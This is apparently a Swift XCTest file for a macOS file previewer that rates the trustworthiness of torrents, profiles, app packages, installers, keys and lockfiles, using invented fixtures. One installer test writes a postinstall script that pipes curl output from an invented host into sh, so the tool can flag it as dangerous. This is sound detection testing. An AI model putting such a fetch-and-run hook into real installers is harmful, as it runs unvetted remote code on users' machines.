import AppKit
import XCTest
@testable import VitrinePreviewKit
import VitrineArchive
import VitrineDocument
import VitrineEngineering
import VitrineSupport

/// The Packages family's cards (S-8, P-2, P-4): a torrent, a configuration profile, an iOS app and an Android app on
/// the Glass Case card with the trust verdict, worded as trust r3-a draws them, and the files one viewer switch away
/// (Card / Contents, Files for a torrent). Fixtures are invented; the iOS app is a clang-built, ad-hoc signed
/// executable zipped by /usr/bin/zip with a profile signed by a throwaway openssl identity.
@MainActor
final class PackageCardsTests: XCTestCase {
    private var dir: URL!

    override func setUpWithError() throws {
        dir = FileManager.default.temporaryDirectory.appendingPathComponent("vt-packages-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws { try? FileManager.default.removeItem(at: dir) }

    @discardableResult
    private func run(_ tool: String, _ arguments: [String], in folder: URL? = nil) throws -> String {
        let p = Process()
        p.executableURL = URL(fileURLWithPath: tool)
        p.arguments = arguments
        p.currentDirectoryURL = folder ?? dir
        p.environment = ["PATH": "/usr/bin:/bin", "TMPDIR": FileManager.default.temporaryDirectory.path]
        let err = Pipe()
        p.standardError = err
        p.standardOutput = FileHandle.nullDevice
        try p.run(); p.waitUntilExit()
        let message = String(decoding: err.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)
        if p.terminationStatus != 0 { XCTFail("\(tool) \(arguments): \(message)") }
        return message
    }

    private func write(_ name: String, _ text: String) throws -> URL {
        let url = dir.appendingPathComponent(name)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data(text.utf8).write(to: url)
        return url
    }

    private func render(_ url: URL, _ kind: FileKind) async throws -> (RenderedPreview, BinaryCardView) {
        let preview = try await BinaryCardRenderer().render(url: url, kind: kind, context: RenderContext(appearance: .light, defaultsSuite: "vt-packages"))
        let view = try XCTUnwrap(preview.view as? BinaryCardView)
        view.frame = NSRect(x: 0, y: 0, width: 800, height: 600)
        view.layoutSubtreeIfNeeded()
        return (preview, view)
    }

    // MARK: Routing

    func testRegistryRoutesPackagesToTheCardAndArchivesToTheOutline() {
        for kind in [FileKind.torrent, .configurationProfile, .archive(.ipa), .archive(.apk)] {
            XCTAssertTrue(RendererRegistry.renderer(for: kind) is BinaryCardRenderer, "\(kind)")
        }
        for kind in [FileKind.archive(.rar), .archive(.sevenZip), .archive(.iso), .archive(.deb), .archive(.jar)] {
            XCTAssertTrue(RendererRegistry.renderer(for: kind) is ArchiveRenderer, "\(kind)")
        }
    }

    // MARK: Torrent

    private func torrent(files: [(String, Int)]) -> Data {
        func s(_ x: String) -> String { "\(x.utf8.count):\(x)" }
        let list = files.map { "d6:lengthi\($0.1)e4:pathl" + $0.0.split(separator: "/").map { s(String($0)) }.joined() + "ee" }.joined()
        let info = "d5:filesl\(list)e4:name\(s("open-weather-sample"))12:piece lengthi262144e6:pieces20:\(String(repeating: "x", count: 20))e"
        return Data(("d8:announce\(s("https://data.example.org/announce"))13:announce-listll\(s("https://data.example.org/announce"))el\(s("udp://mirror.example.net:80"))ee4:info\(info)e").utf8)
    }

    func testTorrentCardIsCalmAndListsItsFiles() async throws {
        let url = dir.appendingPathComponent("open-weather.torrent")
        try torrent(files: [("weather.parquet", 3_900_000), ("stations.csv", 284_000), ("README.txt", 6_000)]).write(to: url)
        let (preview, view) = try await render(url, .torrent)
        XCTAssertEqual(view.card.title, "open-weather-sample")
        XCTAssertEqual(view.card.stageChip, "Torrent")
        XCTAssertEqual(view.card.verdict.level, .calm)
        XCTAssertEqual(view.card.verdict.title, "3 files, no programs")
        XCTAssertEqual(view.card.answers.map(\.question), ["What will it download", "Is anything in it a program", "Who shares it"])
        XCTAssertEqual(view.card.answers[2].answer, "2 public trackers")
        XCTAssertTrue(view.card.sentence.hasSuffix("Vitrine never contacts them."), view.card.sentence)
        XCTAssertNotNil(preview.document.fact("infoHash"))
        XCTAssertEqual(preview.document.viewTitles, ["Card", "Files"])
        XCTAssertTrue(preview.showView?(1) == true)
        XCTAssertTrue(view.isShowingContents)
        let contents = try XCTUnwrap(view.contents)
        XCTAssertEqual(contents.outline.rootNodeName, "open-weather-sample")
        XCTAssertEqual(contents.outline.table.numberOfRows, 3)
        XCTAssertTrue(preview.showView?(0) == true)
        XCTAssertFalse(view.isShowingContents)
    }

    func testTorrentWithAProgramIsACaution() async throws {
        let url = dir.appendingPathComponent("tools.torrent")
        try torrent(files: [("setup.exe", 1_000), ("readme.txt", 10)]).write(to: url)
        let (_, view) = try await render(url, .torrent)
        XCTAssertEqual(view.card.verdict.level, .caution)
        XCTAssertEqual(view.card.answers.first { $0.question == "Is anything in it a program" }?.mark, .caution)
    }

    // MARK: Configuration profile

    func testUnsignedProfileWithARootCertificateIsACaution() async throws {
        let url = try write("Example Corp Wi-Fi.mobileconfig", """
        <?xml version="1.0" encoding="UTF-8"?>
        <plist version="1.0"><dict>
        <key>PayloadType</key><string>Configuration</string>
        <key>PayloadDisplayName</key><string>Example Corp Wi-Fi</string>
        <key>PayloadOrganization</key><string>Example Corp IT</string>
        <key>PayloadContent</key><array>
          <dict><key>PayloadType</key><string>com.apple.wifi.managed</string><key>SSID_STR</key><string>ExampleCorp</string></dict>
          <dict><key>PayloadType</key><string>com.apple.vpn.managed</string><key>VPN</key><dict><key>RemoteAddress</key><string>vpn.example.com</string><key>OnDemandEnabled</key><integer>1</integer></dict></dict>
          <dict><key>PayloadType</key><string>com.apple.security.root</string><key>PayloadCertificateFileName</key><string>Example Corp Root CA</string></dict>
        </array>
        </dict></plist>
        """)
        let (_, view) = try await render(url, .configurationProfile)
        XCTAssertEqual(view.card.title, "Example Corp Wi-Fi")
        XCTAssertEqual(view.card.verdict.level, .caution)
        XCTAssertEqual(view.card.verdict.title, "Unverified profile that also installs a root certificate")
        XCTAssertEqual(view.card.verdict.chip, "Check before installing")
        XCTAssertEqual(view.card.sentence, "A configuration profile from Example Corp IT with Wi-Fi, a VPN and a root certificate; it is not signed.")
        XCTAssertEqual(view.card.answers.map(\.question), ["Who sent it", "What does it change", "Can I remove it later"])
        XCTAssertEqual(view.card.answers[1].answer, "Joins Wi-Fi “ExampleCorp”, adds an always-on VPN, trusts a new root certificate")
        XCTAssertEqual(view.card.answers[2].answer, "Yes")
        XCTAssertNil(view.contents, "a profile has no files to show")
    }

    // MARK: iOS app

    func testIPACardWithAnExpiringAdHocProfile() async throws {
        let app = dir.appendingPathComponent("Payload/FieldLog.app")
        try FileManager.default.createDirectory(at: app, withIntermediateDirectories: true)
        _ = try write("Payload/FieldLog.app/Info.plist", """
        <?xml version="1.0" encoding="UTF-8"?>
        <plist version="1.0"><dict>
        <key>CFBundleDisplayName</key><string>FieldLog</string><key>CFBundleIdentifier</key><string>com.example.fieldlog</string>
        <key>CFBundleShortVersionString</key><string>1.8</string><key>CFBundleVersion</key><string>77</string>
        <key>CFBundleExecutable</key><string>FieldLog</string><key>MinimumOSVersion</key><string>17.0</string>
        <key>UIDeviceFamily</key><array><integer>1</integer></array>
        <key>NSLocationWhenInUseUsageDescription</key><string>Tags entries with a place.</string>
        </dict></plist>
        """)
        _ = try write("main.c", "int main(void){return 0;}\n")
        try run("/usr/bin/clang", ["-arch", "arm64", "-o", "Payload/FieldLog.app/FieldLog", "main.c"])
        try run("/usr/bin/codesign", ["-s", "-", "-f", "Payload/FieldLog.app/FieldLog"])
        try run("/usr/bin/openssl", ["req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", "id.key", "-out", "id.pem", "-days", "30",
                                     "-subj", "/CN=Apple Distribution: Example Field Co (F1E2D3C4B5)/OU=F1E2D3C4B5/O=Example Field Co/C=US"])
        try run("/usr/bin/openssl", ["x509", "-in", "id.pem", "-outform", "DER", "-out", "id.der"])
        let der = try Data(contentsOf: dir.appendingPathComponent("id.der"))
        let expiry = ISO8601DateFormatter().string(from: Date().addingTimeInterval(9.5 * 86_400))
        _ = try write("profile.plist", """
        <?xml version="1.0" encoding="UTF-8"?>
        <plist version="1.0"><dict>
        <key>Name</key><string>FieldLog AdHoc</string><key>TeamName</key><string>Example Field Co</string>
        <key>TeamIdentifier</key><array><string>F1E2D3C4B5</string></array>
        <key>ExpirationDate</key><date>\(expiry)</date><key>CreationDate</key><date>2026-01-01T00:00:00Z</date>
        <key>ProvisionedDevices</key><array>\((1...12).map { "<string>DEV\($0)</string>" }.joined())</array>
        <key>DeveloperCertificates</key><array><data>\(der.base64EncodedString())</data></array>
        <key>Entitlements</key><dict><key>aps-environment</key><string>production</string><key>get-task-allow</key><false/></dict>
        </dict></plist>
        """)
        try run("/usr/bin/openssl", ["smime", "-sign", "-nodetach", "-binary", "-outform", "DER", "-in", "profile.plist",
                                     "-signer", "id.pem", "-inkey", "id.key", "-out", "Payload/FieldLog.app/embedded.mobileprovision"])
        try run("/usr/bin/zip", ["-q", "-r", "FieldLog 1.8.ipa", "Payload"])

        let (preview, view) = try await render(dir.appendingPathComponent("FieldLog 1.8.ipa"), .archive(.ipa))
        XCTAssertEqual(view.card.title, "FieldLog")
        XCTAssertEqual(view.card.stageChip, "iOS app")
        XCTAssertEqual(view.card.verdict.level, .caution)
        XCTAssertEqual(view.card.verdict.title, "Ad hoc build: its provisioning profile expires in 9 days")
        XCTAssertEqual(view.card.verdict.chip, "Expires soon")
        XCTAssertEqual(view.card.answers.map(\.question), ["Is it still valid", "Who made it", "How is it distributed", "What can it do"])
        XCTAssertEqual(view.card.answers[2].answer, "Ad hoc, to 12 registered devices")
        XCTAssertEqual(view.card.answers[3].answer, "Location while in use, notifications")
        XCTAssertEqual(preview.document.viewTitles, ["Card", "Contents"])
        XCTAssertTrue(preview.showView?(1) == true)
        XCTAssertEqual(view.contents?.outline.rootNodeName, "Payload")
    }

    // MARK: Android app (the wording, from facts PackageFacts writes)

    func testAndroidCardWords() {
        let doc = PreviewDocument(kind: .archive(.apk), facts: [
            Fact(key: "name", label: "Name", value: "Trail Map"), Fact(key: "package", label: "Package", value: "com.example.trailmap"),
            Fact(key: "version", label: "Version", value: "3.1.0 (42)"), Fact(key: "minSDK", label: "Requires", value: "Android 8.0 (API 26)"),
            Fact(key: "permissionCount", label: "Permissions", value: "3"),
            Fact(key: "dangerous", label: "Sensitive permissions", value: "precise location, camera"),
            Fact(key: "schemes", label: "Signature", value: "v1 (JAR signing) (not verified)"),
            Fact(key: "claimedSigner", label: "Certificate name (not verified)", value: "Trail Map Release"),
        ], badges: [Badge(level: .caution, title: "Asks for 2 sensitive permissions", detail: "precise location, camera.")], views: [.text("")])
        let card = BinaryCard.make(document: doc, url: URL(fileURLWithPath: "/nonexistent/trail.apk"))
        XCTAssertEqual(card.sentence, "An Android app (com.example.trailmap), version 3.1.0 (42), for Android 8.0 (API 26) and later; it asks for 3 permissions, 2 of them sensitive.")
        XCTAssertEqual(card.strip.map(\.value), ["3.1.0", "Android 8.0", "3"])
        XCTAssertEqual(card.verdict.level, .caution)
        XCTAssertEqual(card.numberedAnswers.first?.answer.answer, "Use precise location and camera")
        // S-16 follow-up B (G-34): an APK certificate names itself; the card shows the claim, never a maker.
        let who = card.answers.first { $0.question == "Who made it" }
        XCTAssertEqual(who?.answer, "Not verified")
        XCTAssertEqual(who?.mark, .caution)
        XCTAssertEqual(who?.evidence, "the certificate calls itself “Trail Map Release”, which nothing verified")
    }

    // MARK: Disk images and installers (P-3)

    func testDiskImageCardSaysItIsNotMounted() {
        let doc = PreviewDocument(kind: .diskImage, facts: [
            Fact(key: "format", label: "Format", value: "UDZO (zlib)"), Fact(key: "encrypted", label: "Encrypted", value: "No"),
            Fact(key: "signed", label: "Signature", value: "Signed"), Fact(key: "signer", label: "Signed by", value: "Developer ID Application: Example Co"),
            Fact(key: "notarization", label: "Notarization ticket", value: "Stapled"),
        ], views: [.text("")])
        let card = BinaryCard.make(document: doc, url: URL(fileURLWithPath: "/nonexistent/Acme Notes 3.2.dmg"))
        XCTAssertEqual(card.answers.first { $0.question == "What is inside" }?.answer, "Not listed: Vitrine never mounts a disk image")
        XCTAssertEqual(card.answers.first { $0.question == "Has Apple checked it" }?.answer, "Yes, a notarization ticket is stapled")
        XCTAssertEqual(card.answers.first { $0.question == "Who made it" }?.answer, "Developer ID Application: Example Co")
    }

    func testInstallerOffersItsContents() async throws {
        _ = try write("root/usr/local/share/invented/notes.txt", "invented\n")
        try run("/usr/bin/pkgbuild", ["--quiet", "--root", "root", "--identifier", "com.example.invented", "--version", "1.0",
                                      "--install-location", "/", "invented.pkg"])
        let (preview, view) = try await render(dir.appendingPathComponent("invented.pkg"), .installerPackage)
        XCTAssertEqual(preview.document.viewTitles, ["Card", "Contents"])
        let names = try XCTUnwrap(view.contents?.levels.first?.model.listing.entries.map(\.path))
        XCTAssertTrue(names.contains("PackageInfo") && names.contains("Payload"), "\(names)")
        XCTAssertEqual(preview.document.fact("payloadFiles")?.value.isEmpty, false)
    }

    /// T-1: a Mac app's entitlements in plain words; unknown keys stay out of the sentence.
    func testMacEntitlementsInPlainWords() {
        let words = PackageFacts.macEntitlementWords([
            "com.apple.security.app-sandbox": .bool(true), "com.apple.security.network.client": .bool(true),
            "com.apple.security.device.camera": .bool(true), "com.apple.security.device.usb": .bool(false),
            "com.apple.security.cs.disable-library-validation": .bool(true), "com.example.invented": .bool(true),
        ])
        XCTAssertEqual(words.uses, ["the internet", "the camera"])
        XCTAssertEqual(words.loosened, ["loads code signed by others"])
        XCTAssertEqual(PackageFacts.macEntitlementWords(nil).uses, [])
    }

    func testAppCardSaysWhatItMayUseAndWhatItTurnsOff() {
        func card(_ facts: [Fact]) -> BinaryCard {
            BinaryCard.make(document: PreviewDocument(kind: .appBundle, facts: facts, views: [.text("")]), url: URL(fileURLWithPath: "/nonexistent/Acme Notes.app"))
        }
        let sandboxed = card([Fact(key: "sandboxed", label: "Sandboxed", value: "Yes"), Fact(key: "uses", label: "What it may use", value: "the internet and the camera"),
                              Fact(key: "loosened", label: "Protections it turns off", value: "loads code signed by others")])
        let answer = sandboxed.answers.first { $0.question == "What can it do" }
        XCTAssertEqual(answer?.answer, "The internet and the camera")
        XCTAssertEqual(answer?.evidence, "turns off: loads code signed by others")
        XCTAssertEqual(card([Fact(key: "sandboxed", label: "Sandboxed", value: "Yes")]).answers.first { $0.question == "What can it do" }?.answer, "Only its own files")
        XCTAssertEqual(card([Fact(key: "sandboxed", label: "Sandboxed", value: "No")]).answers.first { $0.question == "What can it do" }?.answer,
                       "What your account can: it is not sandboxed")
    }

    /// T-10: a private key is described and warned about, never shown; a list of SSH keys is calm.
    func testKeyCardsWarnAboutUnprotectedPrivateKeysOnly() throws {
        _ = try run("/usr/bin/ssh-keygen", ["-q", "-t", "ed25519", "-N", "", "-C", "dev@acme.example", "-f", "id_ed25519"])
        let url = dir.appendingPathComponent("id_ed25519")
        let (doc, _) = try XCTUnwrap(try PackageFacts.read(url: url, kind: .keyMaterial))
        let card = BinaryCard.make(document: doc, url: url)
        XCTAssertEqual(card.verdict.level, .caution)
        XCTAssertEqual(card.verdict.chip, "Keep it private")
        XCTAssertEqual(doc.fact("headline")?.value, "Private key · no passphrase")
        let secret = try String(contentsOf: url, encoding: .utf8).split(separator: "\n").filter { !$0.hasPrefix("-----") }.joined()
        XCTAssertFalse(doc.facts.map(\.value).joined().contains(secret.prefix(30)), "no private key text in the facts")
        let pub = try String(contentsOf: dir.appendingPathComponent("id_ed25519.pub"), encoding: .utf8)
        let list = try write("authorized_keys", "no-pty " + pub + pub)
        XCTAssertEqual(FileSniffer.kind(of: list), .keyMaterial)
        let (listDoc, _) = try XCTUnwrap(try PackageFacts.read(url: list, kind: .keyMaterial))
        let listCard = BinaryCard.make(document: listDoc, url: list)
        XCTAssertEqual(listCard.verdict.level, .calm)
        XCTAssertEqual(listCard.sentence, "A list of 2 SSH keys allowed to log in to this account.")
    }

    /// A-12: a lockfile's card counts what can drift (a git branch), not the project's own local crate, and offers
    /// Packages and Source.
    func testLockfileCardCountsOnlyWhatCanDrift() async throws {
        let url = try write("Cargo.lock", """
        version = 4

        [[package]]
        name = "acme-sync"
        version = "0.3.0"
        dependencies = ["harbor-codec", "tidewater-net"]

        [[package]]
        name = "harbor-codec"
        version = "1.2.0"
        source = "registry+https://github.com/rust-lang/crates.io-index"
        checksum = "0000000000000000000000000000000000000000000000000000000000000001"

        [[package]]
        name = "tidewater-net"
        version = "0.9.0"
        source = "git+https://github.com/example/tidewater-net?branch=main#"
        """)
        XCTAssertEqual(FileSniffer.kind(of: url), .lockfile)
        let (preview, _) = try await render(url, .lockfile)
        XCTAssertEqual(preview.document.viewTitles, ["Card", "Packages", "Source"])
        XCTAssertEqual(preview.document.fact("loose")?.value, "1")
        let card = BinaryCard.make(document: preview.document, url: url)
        XCTAssertEqual(card.title, "Cargo.lock")
        XCTAssertEqual(card.verdict.level, .caution)
        XCTAssertEqual(card.sentence, "A lockfile for Cargo, pinning 3 packages, 2 of them direct, from 3 sources.")
    }

    /// G-26: a lockfile is checked against the installed OSV list; an advisory is orange, a malicious package red, and
    /// every answer carries the list's date. Invented records only.
    func testLockfileCardShowsKnownAdvisoriesFromTheInstalledList() async throws {
        let store = dir.appendingPathComponent("advisories")
        try FileManager.default.createDirectory(at: store, withIntermediateDirectories: true)
        AdvisoryStore.directoryOverride = store
        defer { AdvisoryStore.directoryOverride = nil }
        func install(_ records: [String]) throws {
            let index = AdvisoryIndex.build(ecosystem: .npm, records: records.map { Data($0.utf8) }, sourceLastModified: Date(timeIntervalSince1970: 1_793_000_000))
            try index.write(to: try XCTUnwrap(AdvisoryStore.indexURL(.npm)))
        }
        let lock = try write("package-lock.json", """
        {"name":"acme-notes","lockfileVersion":3,"packages":{
          "":{"name":"acme-notes","dependencies":{"lumen-md":"^4.0.0"}},
          "node_modules/lumen-md":{"version":"4.0.1","resolved":"https://registry.npmjs.org/lumen-md/-/lumen-md-4.0.1.tgz","integrity":"sha512-aW52"},
          "node_modules/harbor-utils":{"version":"2.1.3","resolved":"https://registry.npmjs.org/harbor-utils/-/harbor-utils-2.1.3.tgz","integrity":"sha512-aW53"}}}
        """)
        try install([#"{"id":"GHSA-test-0001","summary":"Invented prototype pollution","affected":[{"package":{"ecosystem":"npm","name":"lumen-md"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"4.0.2"}]}]}],"database_specific":{"severity":"HIGH"}}"#])
        var (preview, _) = try await render(lock, .lockfile)
        XCTAssertEqual(preview.document.fact("advisoryCount")?.value, "1")
        var card = BinaryCard.make(document: preview.document, url: lock)
        XCTAssertEqual(card.verdict.level, .caution)
        XCTAssertEqual(card.answers.first?.question, "Any known advisories")
        XCTAssertTrue(card.answers.first?.evidence?.contains("lumen-md 4.0.1: GHSA-test-0001 · high · fixed in 4.0.2") == true, card.answers.first?.evidence ?? "")
        try install([#"{"id":"MAL-test-0002","summary":"Invented malware","affected":[{"package":{"ecosystem":"npm","name":"harbor-utils"},"versions":["2.1.3"]}]}"#])
        (preview, _) = try await render(lock, .lockfile)
        card = BinaryCard.make(document: preview.document, url: lock)
        XCTAssertEqual(card.verdict.level, .danger)
        try install([])
        (preview, _) = try await render(lock, .lockfile)
        card = BinaryCard.make(document: preview.document, url: lock)
        XCTAssertEqual(card.verdict.level, .calm)
        XCTAssertTrue(card.verdict.reason.contains("no known advisories in the OSV list from"), card.verdict.reason)
    }

    /// T-1, G-24: "Will macOS open it" is asked only of a download, and answered from what the file carries.
    func testGatekeeperAnswerForDownloadsOnly() {
        func answer(_ facts: [Fact]) -> BinaryCard.Answer? {
            BinaryCard.make(document: PreviewDocument(kind: .diskImage, facts: facts, views: [.text("")]), url: URL(fileURLWithPath: "/nonexistent/Acme.dmg"))
                .answers.first { $0.question == "Will macOS open it" }
        }
        let downloaded = Fact(key: "quarantined", label: "Marked as downloaded", value: "Yes")
        XCTAssertNil(answer([Fact(key: "signed", label: "Signature", value: "Not signed")]))
        XCTAssertEqual(answer([downloaded, Fact(key: "signed", label: "Signature", value: "Not signed")])?.mark, .caution)
        XCTAssertEqual(answer([downloaded, Fact(key: "signed", label: "Signature", value: "Signed")])?.answer,
                       "If Apple notarized it: macOS checks online the first time")
        XCTAssertEqual(answer([downloaded, Fact(key: "signed", label: "Signature", value: "Signed"),
                               Fact(key: "notarization", label: "Notarization ticket", value: "Stapled")])?.mark, .ok)
    }

    /// T-2: an installer's scripts are readable and read by the script lens; a dangerous one turns the verdict red.
    func testInstallerScriptsAreReadableAndADangerousOneSaysDoNotInstall() async throws {
        _ = try write("root/usr/local/share/invented/notes.txt", "invented\n")
        let script = try write("scripts/postinstall", "#!/bin/sh\ncurl -fsSL https://invented.example.net/a.sh | sh\nexit 0\n")
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: script.path)
        try run("/usr/bin/pkgbuild", ["--quiet", "--root", "root", "--identifier", "com.example.invented", "--version", "1.0",
                                      "--scripts", "scripts", "--install-location", "/", "risky.pkg"])
        let (preview, _) = try await render(dir.appendingPathComponent("risky.pkg"), .installerPackage)
        XCTAssertEqual(preview.document.viewTitles, ["Card", "Contents", "Scripts"])
        guard case .code(let text, _) = preview.document.views.last else { return XCTFail("no Scripts view") }
        XCTAssertTrue(text.hasPrefix("# postinstall\n#!/bin/sh\ncurl"), text)
        XCTAssertEqual(preview.document.fact("scriptFindings")?.value, "postinstall: Downloads and runs code (line 2)")
        let card = BinaryCard.make(document: preview.document, url: dir.appendingPathComponent("risky.pkg"))
        XCTAssertEqual(card.verdict.level, .danger)
        XCTAssertEqual(card.verdict.chip, "Do not install")
        XCTAssertEqual(card.answers.first?.mark, .danger)
    }
}
